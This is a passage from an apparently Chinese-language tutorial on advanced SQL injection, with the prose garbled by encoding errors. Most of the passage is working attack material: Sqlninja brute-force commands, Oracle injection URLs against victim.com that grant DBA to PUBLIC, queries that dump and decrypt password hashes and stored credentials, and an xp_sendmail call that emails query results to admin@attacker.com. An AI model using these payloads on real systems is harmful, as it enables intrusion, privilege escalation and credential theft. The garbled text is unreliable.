class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªæœ‰ç›®æ ‡SQL serverå¯ç”¨äº†æ··åˆéªŒè¯æ¨¡å¼ï¼Œsaæ‰èƒ½å·¥ä½œï¼Œä½¿ç”¨æ··åˆéªŒè¯æ¨¡å¼æ—¶ï¼ŒWindowsç”¨æˆ·å’ŒSQL Serverç”¨æˆ·ï¼ˆæ¯”å¦‚saï¼‰å‡å¯é€šè¿‡æ•°æ®åº“éªŒè¯ã€‚å¦‚æœè¿œç¨‹æ•°æ®åº“æœåŠ¡å™¨ä¸Šé…ç½®çš„åªæœ‰WindowséªŒè¯æ¨¡å¼ï¼Œé‚£ä¹ˆæ­¤æ—¶åªæœ‰Windowsç”¨æˆ·èƒ½å¤Ÿè®¿é—®æ•°æ®åº“ï¼Œsaè´¦æˆ·å°†ä¸å¯ç”¨ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- æ£€æµ‹å½“å‰ä½¿ç”¨çš„å“ªç§æ¨¡å¼</span><span class="token keyword">select</span> serverproperty<span class="token punctuation">(</span><span class="token string">'IslntegratedSecurityOnly'</span><span class="token punctuation">)</span><span class="token comment">-- å¦‚æœå½“å‰é‡‡ç”¨çš„åªæœ‰WindowséªŒè¯æ¨¡å¼ï¼Œé‚£ä¹ˆè¯¥æŸ¥è¯¢è¿”å›1ï¼Œå¦åˆ™è¿”å›0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Sqlninjaæš´åŠ›ç ´è§£å‘½ä»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./sqlninj a <span class="token parameter variable">-m</span> bruteforce <span class="token parameter variable">-w</span> wordlist.txt./sqlninj a <span class="token parameter variable">-m</span> fingerprint<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>OPENROWSET è¿˜å¯ç”¨äºå¯»æ‰¾å­˜åœ¨å¼±å£ä»¤çš„SQL Server</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'Network=DBMSSOCN;Address=10.0.0.1;uid=sa; pwd='</span><span class="token punctuation">,</span><span class="token string">'SELECT 1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- æµ‹è¯•openrowsetæ˜¯å¦å¯ç”¨</span><span class="token keyword">select</span> value_in_use <span class="token keyword">from</span> sys<span class="token punctuation">.</span>configurations <span class="token keyword">where</span> name <span class="token operator">LIKE</span> <span class="token string">'Ad Hoc%'</span> <span class="token comment">-- å¦‚æœOPENROWSETå¯ç”¨ï¼Œè¯¥æŸ¥è¯¢å°†è¿”å›1ï¼Œå¦åˆ™å°†è¿”å›0ã€‚ </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="åœ¨æœªæ‰“è¡¥ä¸çš„æœåŠ¡å™¨ä¸Šæå‡æƒé™"><a href="#åœ¨æœªæ‰“è¡¥ä¸çš„æœåŠ¡å™¨ä¸Šæå‡æƒé™" class="headerlink" title="åœ¨æœªæ‰“è¡¥ä¸çš„æœåŠ¡å™¨ä¸Šæå‡æƒé™"></a>åœ¨æœªæ‰“è¡¥ä¸çš„æœåŠ¡å™¨ä¸Šæå‡æƒé™</h4><p>å¦‚æœç›®æ ‡æ•°æ®åº“æœåŠ¡å™¨æ²¡æœ‰æ›´æ–°æœ€æ–°çš„å®‰å…¨è¡¥ä¸ï¼Œå®ƒå°±å¯èƒ½ä¼šå—åˆ°ä¸€ç§æˆ–å¤šç§å¾ˆæœ‰åçš„æ”»å‡»ã€‚</p><p>ä¾‹å­ï¼šCVE-2010-0232æ¼æ´</p><p>Sqlninjaä¸­åŒ…å«äº†ä¸€ä¸ªåˆ©ç”¨è¯¥åŸå§‹æ¼æ´çš„å®šåˆ¶ç‰ˆæœ¬çš„å·¥å…·ã€‚å½“ä»¥sqlä½œä¸ºå‚æ•°æ¥è°ƒç”¨è¯¥å·¥å…·æ—¶ï¼Œ å®ƒå°†å¯»æ‰¾SQLSERVR.EXEè¿›ç¨‹å¹¶å°†è¯¥è¿›ç¨‹çš„æƒé™æå‡ä¸ºSYSTEMã€‚ä¸ºäº†æ‰§è¡Œè¿™ç§æ”»å‡»ï¼Œéœ€è¦ æ‰§è¡Œä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š</p><ul><li><p>ä½¿ç”¨ fingerprint æ¨¡å¼(-m fingerprint)æ£€æŸ¥ xp cmdshell æ˜¯å¦å¯ç”¨(option 3),ä»¥åŠ SQLSERVR. EXEå¹¶æœªä»¥SYSTEMæƒé™è¿è¡Œ(option 5)ã€‚</p></li><li><p>ä½¿ç”¨ upload æ¨¡å¼(-m upload)å°† vdmallowed.exe(option 5)å’Œ vdmexploit.dll(å©tion 6)ä¼ é€åˆ°è¿œç¨‹æœåŠ¡å™¨ã€‚</p></li><li><p>ä½¿ç”¨ command æ¨¡å¼(-m command)è¿è¡Œ â€˜<code>ï¼…TEMP%\\vdmallowed.exe sql</code>ï¼Œ ä»¥æ‰§è¡Œè¯¥æ¼æ´åˆ©ç”¨å·¥å…·ã€‚</p></li></ul><p>å¦‚æœè¿œç¨‹WindowsæœåŠ¡å™¨æ²¡æœ‰æ‰“ä¸Šé’ˆå¯¹è¿™ä¸€æ¼æ´çš„è¡¥ä¸ï¼Œæ­¤æ—¶fingerprintæ¨¡å¼å°†ç¡®è®¤SQL ServerçœŸæ­£è¿è¡Œåœ¨SYSTEMæƒé™ä¹‹ä¸‹ã€‚</p><h5 id="Oracle-1"><a href="#Oracle-1" class="headerlink" title="Oracle"></a>Oracle</h5><p>å¦‚æœæˆ‘ä»¬å¯ä»¥è®¿é—®<code>dbms_xmlquery.newcontext()</code>æˆ–<code>dbms_xmlquery.getxml()</code>(é»˜è®¤å¯¹äºPUBLICæƒé™å¯è®¿é—®)ï¼Œå°±å¯ä»¥é€šè¿‡åŒ¿åPL/SQLä»£ç å—æ‰§è¡Œæ³¨å…¥</p><p>ä¸éœ€è¦PL/SQLæ³¨å…¥çš„ä¸€ä¸ªä¾‹å­æ˜¯ï¼šä½¿ç”¨åœ¨Oracleçš„mod_plsqlç»„ä»¶ä¸­å‘ç°çš„ä¸€ä¸ªæ¼æ´ã€‚ ä¸‹åˆ—URLå±•ç¤ºäº†ä¸€ç§é€šè¿‡driloadåŒ…æå‡æƒé™çš„æ–¹æ³•ã€‚è¿™ä¸ªåŒ…æœªè¢«mod_plsqlç»„ä»¶è¿‡æ»¤ï¼Œæ‰€æœ‰Webç”¨æˆ·å‡å¯é€šè¿‡è¾“å…¥ä¸‹åˆ—URLæ¥æå‡æƒé™ï¼š</p><p><a href="http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC">http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC</a></p><p>åœ¨åˆ©ç”¨å¤§å¤šæ•°æƒé™æå‡æ¼æ´æ—¶ä½¿ç”¨äº†ä¸‹åˆ—æ¦‚å¿µï¼š</p><ol><li>åˆ›å»ºä¸€ä¸ªå°†DBAæƒé™æˆæƒç»™å…¬å…±è§’è‰²çš„æœ‰æ•ˆè½½è·ã€‚è¿™æ¯”å°†DBAæƒé™æˆæƒç»™æŒ‡å®šçš„ç”¨æˆ·æ›´éšè”½äº›ã€‚ä¸‹ä¸€æ­¥å°†æŠŠè¯¥æœ‰æ•ˆè½½è·æ³¨å…¥ä¸€ä¸ªæ˜“å—æ”»å‡»çš„PL/SQLå­˜å‚¨è¿‡ç¨‹ä¸­ã€‚</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> F1 <span class="token keyword">return</span> numberauthid <span class="token keyword">current_user</span> <span class="token keyword">as</span>pragma autonomous_transaction<span class="token punctuation">;</span><span class="token keyword">BEGIN</span><span class="token keyword">EXECUTE</span> IMMEDIATE <span class="token string">'GRANT DBA TO PUBLIC'</span>ï¼›<span class="token keyword">COMMIT</span><span class="token punctuation">;</span><span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>å°†è¯¥æœ‰æ•ˆè½½è·æ³¨å…¥ä¸€ä¸ªæ˜“å—æ”»å‡»çš„åŒ…ä¸­ï¼š</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> sys<span class="token punctuation">.</span>kupw$WORKER<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'YY'' and 1=user12.f1 -- mytagl2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>å¯ç”¨DBAè§’è‰²ï¼š</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> role DBA<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>ä»å…¬å…±è§’è‰²ä¸­æ’¤é”€DBAè§’è‰²ï¼š</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">revoke</span> DBA <span class="token keyword">from</span> <span class="token keyword">PUBLIC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“å‰ä¼šè¯è™½ç„¶ä»ç„¶æ‹¥æœ‰DBAæƒé™ï¼Œä½†å´ä¸å†å‡ºç°åœ¨Oracleçš„æƒé™è¡¨ä¸­ã€‚</p><h5 id="SYS-LT"><a href="#SYS-LT" class="headerlink" title="SYS.LT"></a>SYS.LT</h5><p>å¦‚æœæ•°æ®åº“ç”¨æˆ·å…·æœ‰CREATE PROCEDUREæƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨è¯¥ç”¨æˆ·çš„æ¨¡å¼(schema) ä¸­åˆ›å»ºä¸€ä¸ªæ¶æ„å‡½æ•°ï¼Œå¹¶åœ¨SYS.LTåŒ…çš„ä¸€ä¸ªå®¹æ˜“é­å—æ”»å‡»çš„å¯¹è±¡ä¸­æ³¨å…¥è¯¥å‡½æ•°(2009å¹´4æœˆ Oracleå·²ç»ä¿®æ­£äº†è¿™ä¸€é—®é¢˜)ã€‚è¿™ä¸€æ”»å‡»çš„ç»“æœï¼Œå°±æ˜¯æˆ‘ä»¬çš„æ¶æ„å‡½æ•°åœ¨SYSè®¸å¯æƒé™ä¸‹è·å¾— æ‰§è¡Œï¼Œå¹¶ä¸”æˆ‘ä»¬è·å¾—äº† DBAæƒé™ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- åˆ›å»ºå‡½æ•°</span>http:<span class="token comment">//www.victim.com/inciex.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate "create or replace function pwn2 return varchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate ""grant dba to public"";commit;return "",1"";END;''; commit; end;') from dual) is not null -- </span><span class="token comment">-- åˆ©ç”¨ SYS.LT</span>http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery. newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate "begin SYS.LT.CREATEWORKSPACE(""A10""""" and scott.pwn2()=""""x"");SYS.LT.REMOVEWORKSPACE(""A10"""" and scott.pwn2()=""""x"");end;";commit;end;') from dual) is not null -- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SYS-DBMS-CDC-PUBLISH"><a href="#SYS-DBMS-CDC-PUBLISH" class="headerlink" title="SYS.DBMS_CDC_PUBLISH"></a>SYS.DBMS_CDC_PUBLISH</h4><p>è¯¥é—®é¢˜åœ¨sys.dbms_cdc_publish.create_change_setåŒ…ä¸­ï¼Œè¯¥æ¼æ´å…è®¸ä¸€ä¸ªå…·æœ‰execute catalog roleæƒé™çš„ç”¨æˆ·æˆä¸ºDBA</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set(''''a'''',''''a'''',''''a''''''''||SCOTT.pwn2()||''''''''a'''',''''Y'''',sysdate,sysdate);end;'';commit; end;') from dual) is not null--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="ç»•è¿‡-CREATE-PROCEDURE-æƒé™"><a href="#ç»•è¿‡-CREATE-PROCEDURE-æƒé™" class="headerlink" title="ç»•è¿‡ CREATE PROCEDURE æƒé™"></a>ç»•è¿‡ CREATE PROCEDURE æƒé™</h5><p>è¦æ±‚å…·æœ‰create procedureæƒé™</p><h5 id="cursoræ³¨å…¥"><a href="#cursoræ³¨å…¥" class="headerlink" title="cursoræ³¨å…¥"></a>cursoræ³¨å…¥</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/index.jsp?id=l and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' DECLARE D NUMBER;BEGIN D:= DBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(D,''''declare pragma autonomous_transaction; begin execute immediate ''''''''' grant dba to public'''''''';commit;end;'''',0);SYS.LT.CREATEWORKSPACE(''''a''''''' and dbms_sql.execute(''''||D||'''')=1--');SYS.LT.COMPRESSWORKSPACETREE(''''a'''''''' and dbms_sql.execute(''''||D||'''')=1--'''');end;''; commit; end;') from dual) is not null--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="SYS-KUPP-PROC"><a href="#SYS-KUPP-PROC" class="headerlink" title="SYS.KUPP$PROC"></a>SYS.KUPP$PROC</h5><p>SYS.KUPPSPROC.CREATE MASTER PROCESS()å‡½æ•°æ˜¯å¦å¤–ä¸€ä¸ª Oracle å‡½æ•°ï¼Œå®ƒå…è®¸æ‰§è¡Œä»»æ„PL/SQLè¯­å¥ã€‚åªæœ‰å…·æœ‰DBAè§’è‰²çš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œè¯¥å‡½æ•°ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">' declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.vulnproc(''''a''''''''||sys.kupp$proc.create_master_process(''''''''EXECUTE IMMEDIATE''''''''''''''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE''''''''''''''''''''''''''''''''GR ANT DBA TO PUBLIC'''''''''''''''''''''''''''''''';END;'''''''''''''''''''''''''''''''';'''''''')||''''''''a'''');end; ''; commit; end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="å¼±è®¸å¯æƒé™"><a href="#å¼±è®¸å¯æƒé™" class="headerlink" title="å¼±è®¸å¯æƒé™"></a>å¼±è®¸å¯æƒé™</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">VIEW</span><span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">TRIGGER</span><span class="token keyword">CREATE</span> <span class="token keyword">ANY</span> <span class="token keyword">PROCEDURE</span><span class="token keyword">EXECUTE</span> <span class="token keyword">ANY</span> <span class="token keyword">PROCEDURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™äº›æƒé™é—´æ¥åœ°å…è®¸æƒé™æå‡æ”»å‡»ã€‚</p><p>ä½¿ç”¨<code>CREATE ANY TRIGGER</code>æå‡æƒé™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> dbms_xmlquery<span class="token punctuation">.</span>newcontext<span class="token punctuation">(</span><span class="token string">'declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' create or replace trigger "SYSTEM". the_trigger before insert on system.OL$ for each row declare pragma autonomous_transaction; BEGIN execute immediate ''''GRANT DBA TO PUBLIC''''; END the_trigger;'';end;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="çªƒå–å“ˆå¸Œå£ä»¤"><a href="#çªƒå–å“ˆå¸Œå£ä»¤" class="headerlink" title="çªƒå–å“ˆå¸Œå£ä»¤"></a>çªƒå–å“ˆå¸Œå£ä»¤</h3><h4 id="SQL-Server-2"><a href="#SQL-Server-2" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>ä¸åŒç‰ˆæœ¬ï¼Œå·®åˆ«å¾ˆå¤§ï¼Œéƒ½éœ€è¦ç®¡ç†å‘˜æƒé™æ‰èƒ½è®¿é—®å“ˆå¸Œå£ä»¤è¡¨</p><h5 id="SQL-Server-2000"><a href="#SQL-Server-2000" class="headerlink" title="SQL Server 2000"></a>SQL Server 2000</h5><p>å“ˆå¸Œå£ä»¤å‚¨å­˜åœ¨masteræ•°æ®åº“çš„sysxloginsè¡¨ä¸­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> name<span class="token punctuation">,</span>password <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysxlogins <span class="token comment">-- æ£€ç´¢</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”±pwdencrypt()å‡½æ•°ç”Ÿæˆï¼Œå“ˆå¸Œå€¼ç”±å¤´ï¼Œsaltï¼ŒåŒºåˆ†å¤§å°å†™çš„å“ˆå¸Œï¼Œä¸åŒºåˆ†å¤§å°å†™çš„å“ˆå¸Œç»„æˆ</p><h5 id="SQL-Server-2005-2008"><a href="#SQL-Server-2005-2008" class="headerlink" title="SQL Server 2005,2008"></a>SQL Server 2005,2008</h5><p>sysxloginsä¸å­˜åœ¨äº†ï¼Œç§»é™¤äº†ä¸åŒºåˆ†å¤§å°å†™çš„å“ˆå¸Œ</p><p>é€šè¿‡æŸ¥è¯¢sql_loginsè§†å›¾æ£€ç´¢å“ˆå¸Œå£ä»¤</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> password_hash <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨fh_varbintohexstr()å‡½æ•°å°†å“ˆå¸Œå€¼æ˜¾å¼åœ°å¼ºåˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/products.asp?id=1+union+select+master.dbo.fn_varbintohexstr(password_hash)+from+sys.sql_logins+where+name+=+'sa'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">;</span><span class="token comment">-- æ£€ç´¢å“ˆå¸Œå£ä»¤ï¼Œå“ˆå¸Œå£ä»¤ç”±password()å‡½æ•°äº§ç”Ÿï¼Œç®—æ³•éšç‰ˆæœ¬</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="PostgreSQL-2"><a href="#PostgreSQL-2" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><p>å¦‚æœåˆšå¥½å…·æœ‰administrativeæƒé™ï¼Œå°±å¯ä»¥è®¿é—®pg_shadowè¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> usename<span class="token punctuation">,</span> passwd <span class="token keyword">FROM</span> pg_shadow<span class="token keyword">SELECT</span> rolname<span class="token punctuation">,</span> rolpassword <span class="token keyword">FROM</span> pg_authid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">HASH</span> <span class="token operator">=</span> <span class="token string">'md5'</span> <span class="token operator">||</span> MD5<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">)</span> <span class="token operator">=</span> md53858f62230ac3c915f300c664312c63f<span class="token comment">-- fooæ˜¯passwordï¼Œbaræ˜¯username </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Oracle-2"><a href="#Oracle-2" class="headerlink" title="Oracle"></a>Oracle</h4><p>Oracleåœ¨sys.user$è¡¨çš„passwordåˆ—å­˜å‚¨æ•°æ®åº“è´¦æˆ·çš„å“ˆå¸Œå£ä»¤ã€‚dba_usersè§†å›¾æŒ‡å‘è¯¥è¡¨ï¼Œä½†ä»Oracle 11gå¼€å§‹ï¼Œæ•°æ®åŠ å¯†æ ‡å‡†(Data Encryption Standard, DES)çš„å“ˆå¸Œå£ä»¤ä¸å†å‡ºç°åœ¨ dba_userè§†å›¾ä¸­ã€‚sys.user$è¡¨åŒ…å«æ•°æ®åº“ç”¨æˆ·(type#=1)å’Œæ•°æ®åº“è§’è‰²(type#=0)çš„å“ˆå¸Œå£ä»¤ã€‚</p><p>é’ˆå¯¹Oracle DESç”¨æˆ·åå£ä»¤ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 andlength(password)=16</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é’ˆå¯¹Oracle DESè§’è‰²å£ä»¤ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#=1</span>andlength<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é’ˆå¯¹ Oracle SHA1 å£ä»¤(11g+)ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>substr<span class="token punctuation">(</span>spare4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span> <span class="token keyword">hash</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span>spare4<span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span> salt fromsys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(spare4)=62;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sysman.mgmt_credentials2è¡¨æ˜¯é€šå¸¸èƒ½æ‰¾åˆ°çš„SYSç”¨æˆ·æ˜æ–‡å£ä»¤çš„ç¤ºä¾‹ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- get the cleartext password of the user MGMT_VIEW (generated by Oracle during the installation time, looks like a hash but is a password) </span><span class="token keyword">select</span> view_username<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>view_password<span class="token punctuation">)</span> Password <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_view_user_credentials<span class="token punctuation">;</span><span class="token comment">-- get the password of the dbsnmp user, databases listener and OS credentials</span><span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>t1<span class="token punctuation">.</span>credential_value<span class="token punctuation">)</span> sysmanuser<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>t2<span class="token punctuation">.</span>credential_value<span class="token punctuation">)</span> Password <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_credentials2 t1<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>mgmt_credentials2 t2 <span class="token keyword">where</span> t1<span class="token punctuation">.</span>credential_guid<span class="token operator">=</span>t2<span class="token punctuation">.</span>credential_guid<span class="token operator">and</span> lower<span class="token punctuation">(</span>t1<span class="token punctuation">.</span>credential_set_column<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'username'</span><span class="token operator">and</span> lower<span class="token punctuation">(</span>t2<span class="token punctuation">.</span>credential_set_column<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'password'</span><span class="token comment">-- get the username and password of the Oracle Knowledgebase Metalink </span><span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ARU_USERNAME<span class="token punctuation">)</span><span class="token punctuation">,</span>sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ARU_PASSWORD<span class="token punctuation">)</span> <span class="token keyword">from</span> SYSMAN<span class="token punctuation">.</span>MGMT_ARU_CREDENTIALS<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Oracleç»„ä»¶"><a href="#Oracleç»„ä»¶" class="headerlink" title="Oracleç»„ä»¶"></a>Oracleç»„ä»¶</h5><ul><li>APEX</li><li>Oracle Internet Directory</li></ul><h3 id="å¸¦å¤–é€šä¿¡"><a href="#å¸¦å¤–é€šä¿¡" class="headerlink" title="å¸¦å¤–é€šä¿¡"></a>å¸¦å¤–é€šä¿¡</h3><p>ç”¨äºå‘é€è¯·æ±‚çš„HTTP(S)è¿æ¥è¢«ç”¨äºæ¥æ”¶å“åº”ã€‚ä¸è¿‡ä¹Ÿæœ‰ä¾‹å¤–çš„æƒ…å†µï¼šå¯ä»¥é€šè¿‡å®Œå…¨ä¸åŒçš„ä¿¡é“æ¥ä¼ è¾“ç»“æœã€‚æˆ‘ä»¬ç§°è¿™æ ·çš„é€šä¿¡ ä¸ºâ€œå¸¦å¤–â€ï¼Œæˆ–ç®€ç§°ä¸ºOOB(Out Of Band)ã€‚</p><h4 id="e-mail"><a href="#e-mail" class="headerlink" title="e-mail"></a>e-mail</h4><p>æ”»å‡»è€…éœ€è¦åšçš„æ˜¯æ„é€ ä¸€ç§åˆ©ç”¨ï¼Œé€šè¿‡å®ƒæ¥æå–æƒ³è¦çš„ä¿¡æ¯ï¼Œå°†æ•°æ®æ‰“åŒ…åˆ°e-mailä¸­å¹¶ä½¿ç”¨ä¸“é—¨çš„æ•°æ®åº“å‡½æ•°æ’å…¥åˆ°e-mailé˜Ÿåˆ—ä¸­ã€‚ä¹‹åè¯¥e-mailå°±ä¼šå‡ºç°åœ¨æ”»å‡»è€…çš„é‚®ç®±ä¸­ã€‚</p><h5 id="MS-Server"><a href="#MS-Server" class="headerlink" title="MS Server"></a>MS Server</h5><p>SQL Mailï¼ˆSQL Server 2000ã€2005 å’Œ 2008ï¼‰å’Œ Database Mailï¼ˆSQL Server 2005 å’Œ 2008ï¼‰</p><ul><li><p>SQL Mail</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_startmail<span class="token punctuation">;</span><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_sendmail <span class="token variable">@recipients</span> <span class="token operator">=</span> <span class="token string">'admin@attacker.com'</span><span class="token punctuation">,</span> <span class="token variable">@query</span> <span class="token operator">=</span><span class="token string">'select @@version'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>Database Mail</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Enable Database Mail</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'Database Mail XPs'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token comment">-- Create a new account, MYACC. The SMTP server is provided in this call. </span><span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token 